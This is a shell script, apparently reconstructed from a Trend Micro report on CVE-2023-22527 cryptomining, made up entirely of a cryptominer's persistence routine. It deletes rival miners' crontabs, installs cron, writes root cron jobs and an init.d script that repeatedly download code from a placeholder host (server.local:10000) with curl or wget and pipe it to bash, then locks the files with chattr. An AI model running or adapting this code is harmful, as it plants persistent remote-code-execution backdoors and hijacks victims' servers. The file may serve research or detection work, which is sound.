# https://www.trendmicro.com/en_us/research/24/h/cve-2023-22527-cryptomining.html

cron(){
if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep -q "competitor1.local\|competitor2.local\|competitor3.local\|competitor4.local\|somebase64goesherelol\|competitor5.local\|competitor6.local"
then
    chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
    crontab -r
fi

if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep "server.local"
then
    echo "Cron exists"
else
    apt-get install -y cron
    yum install -y vixie-cron crontabs
    service crond start
    chkconfig --level 35 crond on
    echo "Cron not found"
    echo -e "30 23 * * * root (curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh\n##" > /etc/cron.d/`whoami`
    echo -e "30 23 * * * root (curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh\n##" > /etc/cron.d/apache
    echo -e "30 23 * * * root (curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh\n##" > /etc/cron.d/nginx
    echo -e "30 23 * * * (curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1)|bash -sh\n##" > /var/spool/cron/`whoami`
    mkdir -p /var/spool/cron/crontabs
    echo -e "30 23 * * * (curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1)|bash -sh\n##" > /var/spool/cron/crontabs/`whoami`
    mkdir -p /etc/cron.hourly
    echo "(curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
    echo "(curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh" > /etc/init.d/down | chmod 755 /etc/init.d/down
    chattr +ai -v /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 /etc/init.d/down
fi
chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
echo "(curl -s http://server.local:10000/somethinggoeshere1|wget -q -O - http://server.local:10000/somethinggoeshere1 )|bash -sh" > /etc/init.d/down | chmod 755 /etc/init.d/down
}
